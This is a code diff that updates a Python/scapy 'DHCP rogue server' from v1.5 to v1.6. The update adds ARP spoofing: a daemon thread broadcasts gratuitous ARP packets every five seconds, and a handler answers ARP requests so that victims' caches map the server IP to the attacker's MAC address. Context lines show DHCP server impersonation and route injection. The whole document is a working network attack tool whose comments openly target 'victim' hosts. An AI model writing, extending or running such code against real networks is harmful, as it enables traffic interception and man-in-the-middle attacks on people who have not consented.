@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
-# v1.5
+# v1.6
 import argparse
 import ipaddress
 import os
 import sys
+import threading
+import time
 
 from scapy.all import (
-    Ether, IP, UDP, BOOTP, DHCP,
+    ARP, Ether, IP, UDP, BOOTP, DHCP,
     sniff, sendp, get_if_hwaddr, get_if_addr, get_if_list, conf
 )
 
@@ -27,6 +29,42 @@ leases    = {}
 allocated = set()
 pending   = {}
 pool      = []
+
+
+# ── ARP helpers ───────────────────────────────────────────────────────────────
+
+def send_gratuitous_arp() -> None:
+    """Broadcast SERVER_IP → our MAC so the victim's ARP cache is pre-populated."""
+    mac = get_if_hwaddr(IFACE)
+    pkt = (
+        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+        ARP(op=2, hwsrc=mac, psrc=SERVER_IP,
+            hwdst="ff:ff:ff:ff:ff:ff", pdst=SERVER_IP)
+    )
+    sendp(pkt, iface=IFACE, verbose=False)
+
+
+def _arp_announce_loop(interval: int) -> None:
+    """Daemon: re-broadcast SERVER_IP → our MAC every `interval` seconds."""
+    while True:
+        send_gratuitous_arp()
+        time.sleep(interval)
+
+
+def handle_arp(pkt) -> None:
+    """Reply to WHO-HAS SERVER_IP with our MAC (unicast reply to requester)."""
+    if not pkt.haslayer(ARP):
+        return
+    arp = pkt[ARP]
+    if arp.op != 1 or arp.pdst != SERVER_IP:
+        return
+    mac   = get_if_hwaddr(IFACE)
+    reply = (
+        Ether(src=mac, dst=arp.hwsrc) /
+        ARP(op=2, hwsrc=mac, psrc=SERVER_IP, hwdst=arp.hwsrc, pdst=arp.psrc)
+    )
+    sendp(reply, iface=IFACE, verbose=False)
+    print(f"[ARP ] {arp.psrc} asked for {SERVER_IP} -> replied {mac}")
 
 
 # ── Route encoding ─────────────────────────────────────────────────────────────
@@ -278,15 +316,25 @@ def main():
         ("192.0.0.0/2", SERVER_IP),
     ])
 
-    print(f"[*] DHCP rogue server v1.5  iface={IFACE}  server={SERVER_IP}")
+    print(f"[*] DHCP rogue server v1.6  iface={IFACE}  server={SERVER_IP}")
     print(f"[*] Pool: {SUBNET} [{args.pool_start}-{args.pool_end}]  GW: {GATEWAY}  DNS: {DNS}")
     print(f"[*] Impersonation: {'ON (spoofing ' + REAL_SERVER + ')' if IMPERSONATE else 'OFF'}")
-    print("[*] Listening for DHCP...  Ctrl+C to stop\n")
+    print("[*] Listening for DHCP + ARP...  Ctrl+C to stop\n")
+
+    # Seed victim ARP caches immediately, then keep refreshing every 5 s.
+    send_gratuitous_arp()
+    threading.Thread(target=_arp_announce_loop, args=(5,), daemon=True).start()
+
+    def _packet_handler(pkt):
+        if pkt.haslayer(ARP):
+            handle_arp(pkt)
+        else:
+            handle_dhcp(pkt)
 
     sniff(
         iface=IFACE,
-        filter="udp and (port 67 or port 68)",
-        prn=handle_dhcp,
+        filter="(udp and (port 67 or port 68)) or arp",
+        prn=_packet_handler,
         store=False,
     )
 
